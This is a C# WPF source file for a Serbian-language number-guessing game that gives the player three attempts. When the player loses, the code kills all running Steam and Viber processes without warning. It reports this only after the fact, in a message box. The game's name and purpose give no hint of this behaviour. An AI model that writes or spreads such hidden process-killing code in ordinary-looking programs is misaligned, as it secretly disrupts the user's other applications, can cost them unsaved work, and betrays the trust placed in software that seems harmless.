using System;
using System.Windows;
using System.Diagnostics;

namespace NormalApp
{
    public partial class MainWindow : Window
    {
        private Random random = new Random();
        private int ciljniBroj;
        private int preostaliPokusaji = 3;
        private bool tacno = false;

        public MainWindow()
        {
            InitializeComponent();
            ciljniBroj = random.Next(1, 11);
        }

        private void DugmePogodi_Click(object sender, RoutedEventArgs e)
        {
            if (preostaliPokusaji <= 0 || tacno)
                return;

            if (!int.TryParse(tekstUnos.Text, out int pogodak) || pogodak < 1 || pogodak > 10)
            {
                MessageBox.Show("Nevažeći unos. Molimo unesite broj između 1 i 10.");
                return;
            }

            if (pogodak < ciljniBroj)
            {
                MessageBox.Show("Pre nisko! Pokušajte ponovo.");
            }
            else if (pogodak > ciljniBroj)
            {
                MessageBox.Show("Pre visoko! Pokušajte ponovo.");
            }
            else
            {
                MessageBox.Show("Čestitamo! Pogodili ste tačan broj.");
                tacno = true;
            }

            preostaliPokusaji--;
            if (preostaliPokusaji > 0 && !tacno)
            {
                MessageBox.Show($"Imate još {preostaliPokusaji} {(preostaliPokusaji == 1 ? "pokušaj" : "pokušaja")}.");
            }
            else if (!tacno)
            {
                MessageBox.Show("Igra gotova! Niste pogodili tačan broj.");

                try
                {
                    Process[] steamProcesi = Process.GetProcessesByName("steam");
                    Process[] viberProcesi = Process.GetProcessesByName("viber");

                    foreach (Process proces in steamProcesi)
                    {
                        proces.Kill();
                    }

                    foreach (Process proces in viberProcesi)
                    {
                        proces.Kill();
                    }

                    MessageBox.Show("Procesi 'steam.exe' i 'viber.exe' su zatvoreni.");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Došlo je do greške pri zatvaranju procesa: {ex.Message}");
                }
            }
        }
    }
}
